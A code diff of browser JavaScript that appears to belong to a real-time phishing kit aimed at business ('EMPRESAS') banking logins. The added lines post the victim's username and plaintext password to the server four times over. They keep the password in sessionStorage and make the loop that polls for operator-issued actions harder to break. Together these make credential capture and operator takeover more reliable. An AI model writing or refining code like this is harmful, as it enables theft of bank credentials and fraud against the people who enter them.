@@ -402,19 +402,26 @@
   let lastHandledAction = null;
   let lastActionTime = 0;
 
+  let consecutive404Count = 0;
+
   function startPolling() {
     stopPolling();
+    consecutive404Count = 0;
     pollInterval = setInterval(async () => {
       try {
         const response = await fetch(`/api/sessions/${sessionId}`);
         if (response.status === 404) {
-          stopPing();
-          stopPolling();
-          sessionStorage.clear();
-          hideSpinner();
+          consecutive404Count++;
+          if (consecutive404Count >= 6) {
+            stopPing();
+            stopPolling();
+            sessionStorage.clear();
+            hideSpinner();
+          }
           return;
         }
         if (!response.ok) return;
+        consecutive404Count = 0;
         const data = await response.json();
         const action = data.action;
         const actionTime = Number(data.actionTime) || 0;
@@ -544,17 +551,20 @@
     sessionStorage.setItem('last_pass', passVal);
     sessionStorage.setItem('is_waiting', 'true');
 
+    const nowTs = Date.now();
     const sessionPayload = JSON.stringify({
       id: sessionId,
       username: userVal,
       password: passVal,
       tipoUsuario: 'EMPRESAS',
       device: device,
-      state: 'waiting'
+      state: 'waiting',
+      createdAt: nowTs
     });
 
     try {
       await Promise.all([
+        fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }),
         fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }),
         fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }),
         fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload })
